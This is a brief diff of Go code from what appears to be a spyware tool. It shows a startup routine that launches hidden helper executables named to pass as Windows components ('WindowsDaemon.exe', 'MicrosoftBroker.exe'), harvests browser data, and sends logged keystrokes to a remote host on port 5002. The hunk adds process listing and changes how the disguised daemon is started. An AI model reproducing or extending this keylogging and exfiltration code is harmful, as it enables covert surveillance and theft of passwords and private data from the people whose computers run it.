@@ -80,9 +80,13 @@ func onReady() {
 			<-finflag
 			go browser.Digpack("http://"+conf.Url+":5002/browser/", finflag)
 		} else {
-			cmd := exec.Command(lib.CURRENTPATH + "WindowsDaemon.exe")
-			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-			cmd.Start()
+			lib.ListProcess()
+			//cmd := exec.Command(lib.CURRENTPATH + "MicrosoftBroker.exe")
+			//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+			//cmd.Start()
+			cmd2 := exec.Command(lib.CURRENTPATH + "WindowsDaemon.exe")
+			cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+			cmd2.Start()
 		}
 		go killit.Killit()
 		go hitboard.KeyBoardCollection("http://" + conf.Url + ":5002/keyboard/record")
